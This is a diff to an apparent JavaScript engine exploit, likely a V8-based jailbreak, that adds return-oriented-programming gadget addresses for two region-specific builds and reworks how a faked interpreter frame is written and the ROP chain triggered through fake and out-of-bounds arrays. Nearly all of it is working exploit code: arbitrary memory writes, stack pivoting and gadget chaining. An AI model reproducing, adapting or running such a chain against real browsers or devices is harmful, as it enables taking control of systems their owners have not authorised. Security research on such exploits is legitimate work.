@@ -396,6 +396,12 @@ gadgets_eu_6 = {
     pop_rsp_pop_rbp:       0x17ecb4en,
     mov_qword_ptr_rdi_rax: 0x1dcba9n,
     mov_qword_ptr_rdi_rdx: 0x36db4en,
+
+    /** Following Gadgets used to mov_rdi_qword_ptr_rsi **/
+    mov_rsi_qword_ptr_rsi_test_sil_1_jne: 0x12ee681n,   // mov rsi, qword ptr [rsi] ; test sil, 1 ; jne 0x12ee68b ; ret
+                                                        // the jne is neved executed if the value in rsi does not end in 1
+    mov_rdi_rsi_mov_qword_ptr_rdx_rdi:    0x09776c4n,   // mov rdi, rsi ; mov qword ptr [rdx], rdi ; ret
+                                                        // point rdx to a valid address
 };
 
 gadgets_us_5 = {
@@ -416,6 +422,12 @@ gadgets_us_5 = {
     pop_rsp_pop_rbp:       0x17ecb4en,
     mov_qword_ptr_rdi_rax: 0x1dcba9n,
     mov_qword_ptr_rdi_rdx: 0x36db4en,
+
+    /** Following Gadgets used to mov_rdi_qword_ptr_rsi **/
+    mov_rsi_qword_ptr_rsi_test_sil_1_jne: 0x12ee681n,   // mov rsi, qword ptr [rsi] ; test sil, 1 ; jne 0x12ee68b ; ret
+                                                        // the jne is neved executed if the value in rsi does not end in 1
+    mov_rdi_rsi_mov_qword_ptr_rdx_rdi:    0x09776c4n,   // mov rdi, rsi ; mov qword ptr [rdx], rdi ; ret
+                                                        // point rdx to a valid address
 };
 
 gadgets_list = {
@@ -1004,9 +1016,9 @@ function main () {
         */
 
         write64(fake_frame  - 0x20n, base_heap_add + fake_bytecode);  // Put the return code (by pointer) in R14
-                                                                    // this is gonna be offseted by R9
-        write64(fake_frame  - 0x28n, 0x00n);                    // Force the value of R9 = 0                                                                          
-        write64(fake_frame  - 0x18n, 0xff00000000000000n); // Fake value for (Builtins_InterpreterEntryTrampoline+286) to skip break * Builtins_InterpreterEntryTrampoline+303
+                                                                      // this is gonna be offseted by R9
+        write64(fake_frame  - 0x28n, 0x00n);                          // Force the value of R9 = 0
+        write64(fake_frame  - 0x18n, 0xff00000000000000n);            // Fake value for (Builtins_InterpreterEntryTrampoline+286) to skip break * Builtins_InterpreterEntryTrampoline+303
                                                                           
         write64(fake_frame + 0x08n, g.get('pop_rsp')); // pop rsp ; ret --> this change the stack pointer to your stack
         write64(fake_frame + 0x10n, rop_address);
@@ -1055,11 +1067,8 @@ function main () {
             fake_rop[i++] = real_rbp;
             
             write64(add_rop_smash_code_store, 0xab00260325n);
-            oob_arr[39] = base_heap_add + fake_frame;
-            rop_smash(obj_arr[0]);          // Call ROP
-
-            //return BigInt(return_value_buffer[0]); // Return value returned by function
-            // Seems like this is not being executed
+            fake_rw[59] = (fake_frame & 0xffffffffn); // Only 32 bits needed
+            rop_smash(fake_obj_arr[0]);               // Call ROP
         }
 
         function call (address, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
